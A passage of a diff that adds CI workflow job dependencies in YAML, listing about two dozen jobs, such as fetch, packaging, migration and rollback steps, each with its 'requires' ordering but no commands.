+            - findMergeBaseAcrossAllModules
+      - StripImporterBinaries:
+          requires:
+            - findMergeBaseAcrossAllModules
+      - emergency-fetch:
+          requires:
+            - StripImporterBinaries
+      - LowPriorityInstall:
+          requires:
+            - emergency-fetch
+      - checking-out-latest-changes:
+          requires:
+            - emergency-fetch
+      - LongRunningFetch:
+          requires:
+            - checking-out-latest-changes
+      - LaunchNotifierContainers:
+          requires:
+            - LongRunningFetch
+      - hash-registry-package:
+          requires:
+            - LongRunningFetch
+      - admin-panel-image-inspection:
+          requires:
+            - hash-registry-package
+      - ArchiveCompressionPhase3:
+          requires:
+            - admin-panel-image-inspection
+      - fallback-artifact-download:
+          requires:
+            - admin-panel-image-inspection
+      - legacyDatabaseMigration:
+          requires:
+            - fallback-artifact-download
+      - PersistFrameworkBuildSummary:
+          requires:
+            - legacyDatabaseMigration
+      - deferredProvisioningHook:
+          requires:
+            - legacyDatabaseMigration
+      - AutomatedSecurityApprovalHook:
+          requires:
+            - deferredProvisioningHook
+      - status-update-run:
+          requires:
+            - AutomatedSecurityApprovalHook
+      - moving-encoder-metrics:
+          requires:
+            - AutomatedSecurityApprovalHook
+      - daily-mailer-contract-test-run:
+          requires:
+            - moving-encoder-metrics
+      - monthly-container-rebuild:
+          requires:
+            - daily-mailer-contract-test-run
+      - PreReviewReleasePackaging:
+          requires:
+            - daily-mailer-contract-test-run
+      - post-push-archive-extraction:
+          requires:
+            - PreReviewReleasePackaging
+      - storageRollback:
+          requires:
+            - post-push-archive-extraction
